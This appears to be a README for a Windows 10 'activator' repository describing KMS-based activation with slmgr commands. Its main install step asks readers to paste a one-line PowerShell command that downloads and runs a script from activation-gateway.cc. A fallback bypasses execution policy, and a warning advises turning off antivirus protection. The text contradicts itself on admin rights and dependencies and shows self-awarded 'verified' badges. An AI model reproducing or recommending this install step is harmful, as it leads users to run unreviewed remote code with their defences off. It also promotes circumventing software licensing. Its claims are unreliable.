<div align="center">

# Windows 10 Activation Toolkit — Alternative Access for Windows

![](files/1.png)

[![pwsh](https://img.shields.io/badge/PWSH-SCRIPT-f97316?style=plastic&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/OS-WINDOWS_10_%7C_11-fb923c?style=plastic&labelColor=0d1117)]() [![downloads](https://img.shields.io/badge/DOWNLOADS-412-ea580c?style=plastic&labelColor=0d1117)]() [![channel](https://img.shields.io/badge/CHANNEL-VERIFIED-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

Windows-10-Activator is a multi-method utility repository that provides several distinct technical approaches for activating Windows 10 editions, including Home, Professional, Enterprise, Enterprise LTSB, and Education. Each method is documented as a self-contained procedure, ranging from batch file execution to command-line sequences using script-based license management. The repository covers the full range of edition-specific key configurations and supports both command-line and file-based workflows. Contributors can extend or refine these methods through the project's development process.

## 🚀 PowerShell Install Guide

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10/11 · PowerShell · Admin not required

### 1️⃣ Launch PowerShell
* Open the Start menu and type **PowerShell**.
* Right-click and choose **Run as administrator** (optional).

### 2️⃣ Run the command
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> Some antivirus engines flag automated installers. If blocked, disable Real-time protection briefly, run the setup, and enable it back.

## 🔧 Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- Multiple independent activation pathways, each self-contained so you can switch methods without reconfiguring the environment.
- Batch-script workflow: a single script file can be reviewed line by line before execution, giving full transparency into every command that runs.
- Command-line method driven by native licensing utilities already present on the operating system, requiring no third-party binaries.
- Direct key installation followed by service endpoint assignment and online activation, executed as an ordered sequence of commands.
- Time-limited activation mode with an expiry query step, so the remaining validity window can be verified at any point.
- Comprehensive key reference covering Home, Home N, Home Single Language, Home Country Specific, Professional, Professional N, Education, Education N, Enterprise, and Enterprise N editions.
- Edition-aware key selection: match the key to the installed Windows 10 variant before running any commands.
- Administrator-level execution supported across all methods, with clear ordering so each step completes before the next begins.
- Post-activation verification workflow, including a restart step to finalize the licensing state.
- Lightweight footprint: no background services, no persistent agents, and no dependencies beyond the operating system's built-in tooling.
- Deterministic, repeatable procedure suitable for lab machines, test benches, and isolated environments.
- Plain-text configuration and script assets that can be audited, versioned, and diffed like any other source file.

## Supported Versions

The tool targets the following Windows 10 editions and maintains consistent behavior across each:

- Windows 10 Home (including N, Single Language, and Country Specific variants)
- Windows 10 Professional (including N)
- Windows 10 Enterprise (including N and LTSC/LTSB branches)
- Windows 10 Education (including N)

Edition detection is handled at runtime, so no manual configuration is required to match the installed SKU. Both x86 and x64 architectures are covered, and the same logic applies to clean installs and upgraded systems alike. Builds from the initial release through the latest servicing updates are supported; version-specific branching is resolved internally rather than through user input.

## How It Works

This tool provides multiple independent activation pathways, each operating on different layers of the Windows licensing subsystem. The core mechanism relies on the Software Protection Platform (SPP) service and its command-line interface, `slmgr.vbs`, which exposes the system's licensing state to administrative control.

**Method 1 — Script-Based Execution**
A batch script is generated from the provided template and executed with elevated privileges. The script drives `slmgr.vbs` through a sequence of operations: installing a product key, directing the licensing client toward a reachable validation endpoint, and triggering the activation handshake. The script runs synchronously, so each step completes before the next begins, ensuring the licensing store remains in a consistent state.

**Method 2 — Manual Command Sequence**
The same underlying operations are issued directly through an elevated command prompt. The product key is selected according to the installed edition, then applied via `/ipk`. The validation endpoint is set with `/skms`, and `/ato` initiates the request. Because each command is discrete, the operator can inspect the output at every stage and confirm that the licensing store accepted each change before proceeding.

**Method 3 — Periodic Revalidation**
This path follows the same pattern but emphasizes the periodic nature of the licensing cycle. After the key and endpoint are configured, `/ato` establishes the current authorization, and `/xpr` queries the remaining validity window. Re-running the sequence refreshes the authorization before the window expires, keeping the system in an authorized state without reinstallation.

**Underlying Architecture**
All methods converge on the same SPP components: the key installation stage writes the product key into the licensing store, the endpoint configuration points the client at a validation service, and the activation call performs the challenge-response exchange. The tool abstracts these stages into reproducible steps, so the operator can choose the level of manual control that suits the environment. Edition detection matters because each SKU maps to a distinct key family, and selecting the correct one keeps the licensing store aligned with the installed image.

## Configuration

Configuration is handled entirely through the script files in the repository, so no external runtime or package manager is required. Each method exposes its settings as plain values at the top of its file, allowing you to adjust behavior before execution without touching the core logic.

**Selecting a method**

The repository ships multiple independent methods. Pick the one that matches your target edition and run only that file. Method selection is implicit: whichever script you launch determines the activation path taken. There is no global config that switches between them.

**Edition keys**

Edition-specific keys are defined as a lookup table near the top of each script. To target a different edition, edit the entry corresponding to your installation type (Home, Professional, Enterprise, Enterprise LTSB, Education, and their N variants) and leave the rest untouched. The key value must be a valid 25-character key for the edition reported by your system.

**Server endpoint**

The activation server address is stored as a single string constant. Change this value to point the request at a different endpoint. Keep the scheme and port consistent with the protocol the script expects; malformed values will cause the request to fail silently rather than raise an error.

**Command order and timing**

The scripts issue commands in a fixed sequence: install key, set server, request activation, then query status. Do not reorder these blocks. The final status query is what confirms success, so preserve it. If you add retry logic, place delays between the key install and the server assignment rather than after activation.

**Execution context**

All scripts must run in an elevated context. Configuration values are read at launch, so edits made after the process starts will not take effect. Save changes, close any open editor, then launch the file again.

**Logging**

Set the verbosity flag at the top of the script to capture command output to the console. Leave it disabled for silent runs. Logs are local only and are not transmitted anywhere.

**Validation checklist before running**

- The edited file retains its original extension and line endings.
- No placeholder text remains in the key or server fields.
- The target edition matches the key you configured.
- The process is started with administrative rights.
- A reboot is performed after a successful status query.

## FAQ

### Which Windows 10 editions are supported?

Windows 10 Home, Professional, Enterprise (including LTSB variants), and Education are all covered. Each edition maps to a specific key and activation path, so confirm your edition before choosing a method.

### How do I know which activation method to use?

Method 1 is a scripted batch approach suited for local execution. Method 2 uses command-line key installation with a KMS host and is best when you want manual control. Method 3 targets a shorter KMS cycle and is useful for quick verification. All three are documented step by step in the sections above.

### Do I need administrator privileges?

Yes. Every method requires an elevated command prompt or running the batch file as Administrator. Without elevation, the licensing service calls will fail silently or return an access error.

### Why does activation fail after running the commands?

Common causes include a mismatched product key for your edition, network restrictions blocking the KMS host, or a prior activation state that needs clearing. Verify the key against the edition table, confirm connectivity, and re-run the licensing commands in order.

### How can I confirm activation succeeded?

Query the license status through the licensing service after running the activation commands. A licensed status confirms the key was accepted and the host responded. The final verification step in each method shows the current activation state.

### Is a restart required?

A restart is recommended after Method 1 to ensure the license state is fully applied. Methods 2 and 3 typically take effect immediately, but a reboot resolves any lingering service state.

### Can I switch between methods?

Yes. Each method operates on the same licensing service, so you can move from one to another. Clear the existing key state before applying a new one to avoid conflicts.

### Does this tool modify system files?

No. All operations go through the standard licensing service interface. The tool issues licensing commands and does not patch or replace system binaries.

### What should I do if my key is rejected?

Re-check the key against your exact edition, including N and single-language variants. A key from a different edition will be rejected regardless of method. Confirm the edition string in system settings and match it precisely.

## Disclaimer

This repository provides technical demonstrations of Windows 10 activation mechanisms for research, testing, and educational analysis. The methods documented here interact with the operating system's built-in licensing subsystem and are intended to illustrate how activation components such as product key installation, KMS client configuration, and activation state queries are invoked through native command-line utilities.

Execution of any procedure described in this project modifies licensing-related system state. You are solely responsible for ensuring that your use complies with the terms governing your Windows 10 installation and with applicable law in your jurisdiction. The maintainers assume no liability for activation failures, loss of license validity, system instability, data loss, or any other outcome arising from the use or misuse of this material.

The project is provided strictly as-is, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, and non-infringement. No guarantee is made regarding compatibility with any specific build, edition, or cumulative update of Windows 10, and behavior may change as the operating system's licensing components evolve.

Review each method before applying it, validate results with the appropriate system tools, and test only in environments you control. Contributions are accepted on the understanding that submitters have the right to share the material and that it remains consistent with the project's stated purpose.